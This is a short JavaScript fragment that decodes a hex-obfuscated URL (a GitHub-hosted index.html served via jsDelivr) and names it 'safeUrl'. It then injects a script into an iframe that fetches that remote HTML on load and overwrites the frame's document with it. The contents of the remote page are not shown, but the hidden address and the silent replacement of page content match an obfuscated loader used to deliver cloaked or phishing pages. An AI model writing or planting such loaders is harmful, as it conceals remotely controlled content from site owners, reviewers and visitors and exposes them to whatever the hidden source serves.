body.script:
        const params = new URLSearchParams(window.location.search);
        params.set("t", Date.now());
        const hexUrl = "68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f526f6b3537342f6f7069756d406d61696e2f696e6465782e68746d6c";

function decodeHex(hex) {
  return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
}

const safeUrl = decodeHex(hexUrl) + "?" + params.toString();
        let l = `
        \x3Cscript>
        launch();
        function launch() {
          try {
            const url = decodeURIComponent("${safeUrl}");
            fetch(url).then(response => response.text())
              .then(html => {
                document.open();
                document.write(html);
                document.close();
              });
          } catch (error) {
            console.error('error:', error);
          }
        }
        \x3C/script>`; 
        var theIframe = document.getElementById('test'); 
        theIframe.srcdoc = l;
